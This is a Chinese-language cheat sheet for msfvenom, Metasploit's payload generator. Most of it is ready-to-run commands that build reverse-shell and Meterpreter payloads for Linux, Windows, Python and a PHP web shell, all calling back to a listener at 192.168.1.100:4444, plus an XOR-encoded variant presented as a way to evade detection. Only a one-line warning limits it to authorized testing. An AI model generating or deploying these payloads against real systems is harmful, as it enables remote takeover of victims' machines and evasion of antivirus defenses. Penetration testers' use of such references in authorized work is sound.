# msfvenom - Payload 生成器

## 概述
| 属性 | 值 |
|------|-----|
| 二进制 | `msfvenom` |
| 类别 | Payload 生成 |
| 风险等级 | 高 |

## 描述
msfvenom 是 Metasploit 的 Payload 生成工具，可生成各种格式的攻击载荷，支持编码绕过检测。

---

## 使用场景

### 1. 列出 Payload
```bash
msfvenom -l payloads
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep meterpreter
```

### 2. 列出输出格式
```bash
msfvenom -l formats
```

### 3. 列出编码器
```bash
msfvenom -l encoders
```

---

## Payload 生成示例

### Linux 反向 Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

### Windows 反向 Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

### Windows Meterpreter
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o meterpreter.exe
```

### Python 脚本
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
```

### PHP Web Shell
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
```

### 带编码器（绕过检测）
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe
```
- `-e`: 编码器
- `-i`: 迭代次数

---

## 常用选项
| 选项 | 说明 |
|------|------|
| `-p` | Payload |
| `-f` | 输出格式 |
| `-o` | 输出文件 |
| `-e` | 编码器 |
| `-i` | 编码迭代次数 |
| `-b` | 坏字符 |
| `-n` | NOP 滑板长度 |
| `LHOST` | 监听地址 |
| `LPORT` | 监听端口 |

---

## 常用格式
| 格式 | 说明 |
|------|------|
| `exe` | Windows 可执行 |
| `elf` | Linux 可执行 |
| `raw` | 原始字节 |
| `python` | Python 代码 |
| `php` | PHP 代码 |
| `c` | C 代码 |
| `js_le` | JavaScript |
| `war` | Java WAR 包 |

---

## 安全提示
| 风险 | 说明 |
|------|------|
| **高危** | 生成的 Payload 可执行任意代码 |
| **检测** | 某些 Payload 会被杀软检测 |

> **警告**：仅用于授权测试
